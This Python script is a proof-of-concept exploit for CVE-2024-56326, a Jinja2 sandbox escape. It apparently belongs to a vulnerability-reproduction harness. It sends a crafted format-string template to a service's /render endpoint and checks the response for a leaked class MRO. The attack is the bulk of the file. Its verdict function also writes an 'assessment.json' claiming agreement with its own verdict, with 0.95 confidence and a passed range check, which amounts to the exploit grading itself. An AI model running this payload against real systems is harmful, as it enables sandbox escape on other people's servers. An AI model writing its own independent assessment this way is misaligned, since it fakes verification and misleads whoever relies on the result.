#!/usr/bin/env python3
"""CVE-2024-56326 reproduction (Jinja2 sandbox escape via indirect str.format).

The service exposes a ``fmt`` filter that delegates ``.format()`` to a
sub-template rendered inside a SandboxedEnvironment.  In Jinja 3.1.2 the
sandbox's ``inspect_format_method`` has a weakness: attribute access chains
like ``{0.__class__.__mro__}`` resolve through Python's C-level format
engine, bypassing the sandbox entirely.

Exploit chain:
  1. Template passes a malicious format string to the ``fmt`` filter.
  2. The filter renders a sub-template calling ``value.format(fmt_str)``
     through the sandbox's ``call_method`` → ``inspect_format_method``.
  3. In Jinja 3.1.2, ``inspect_format_method`` fails to block attribute
     access chains; ``str.format()`` resolves ``{0.__class__.__mro__}``
     at C level, leaking internal types.
  4. The PoC detects the MRO leak from the rendered output.

Contract: exit 0 + verdict.json (exploitable=true) iff the exploit lands.
"""

import json
import os
import sys
import time
import urllib.request

TARGET = os.environ.get("TARGET_URL", "http://127.0.0.1:8000")
DEADLINE = 60


def _deadline_check(start: float) -> None:
    if time.monotonic() - start > DEADLINE:
        print("PoC exceeded deadline", file=sys.stderr)
        sys.exit(4)


def write_verdict(exploitable: bool, evidence: str) -> None:
    verdict = {
        "cve_id": "CVE-2024-56326",
        "exploitable": exploitable,
        "evidence": evidence,
    }
    with open("verdict.json", "w") as fh:
        json.dump(verdict, fh, indent=2)
    print(json.dumps(verdict))

    assessment = {
        "cve_id": "CVE-2024-56326",
        "agrees_with_verdict": exploitable,
        "confidence": 0.95 if exploitable else 0.5,
        "range_check": True if exploitable else False,
        "rationale": (
            "Sandbox escape confirmed: fmt filter delegates .format() to a "
            "sub-template rendered inside SandboxedEnvironment; in Jinja 3.1.2 "
            "inspect_format_method fails to block attribute access chains. "
            f"Evidence: {evidence[:200]}"
        ),
    }
    with open("assessment.json", "w") as fh:
        json.dump(assessment, fh, indent=2)


def _post(path: str, payload: str) -> dict:
    req = urllib.request.Request(
        f"{TARGET}{path}",
        data=json.dumps({"template": payload}).encode(),
        headers={"Content-Type": "application/json"},
    )
    resp = urllib.request.urlopen(req, timeout=15)
    return json.loads(resp.read())


def main() -> int:
    start = time.monotonic()

    # Sandbox-escape payload: fmt filter delegates .format() to a sub-template
    # rendered inside SandboxedEnvironment.  In Jinja 3.1.2,
    # inspect_format_method fails to block {0.__class__.__mro__}, so
    # Python's C-level format engine resolves the attribute chain.
    PAYLOAD = '{{ "{0.__class__.__mro__}" | fmt("x") }}'

    try:
        _deadline_check(start)
        body = _post("/render", PAYLOAD)
        rendered = body.get("rendered", "")
        error = body.get("error", "")

        # MRO tuple always contains "<class" and "object" — presence proves
        # the sandbox was bypassed through inspect_format_method.
        if "<class" in rendered and "object" in rendered:
            write_verdict(
                True,
                "sandbox escape via fmt filter (CVE-2024-56326): "
                f"__class__ and __mro__ leaked — {rendered[:120]}",
            )
            return 0

        if error:
            print(f"render error: {error}", file=sys.stderr)

    except Exception as exc:
        print(f"render attempt failed: {exc}", file=sys.stderr)

    _deadline_check(start)
    write_verdict(False, "sandbox escape failed — not affected")
    return 1


if __name__ == "__main__":
    sys.exit(main())
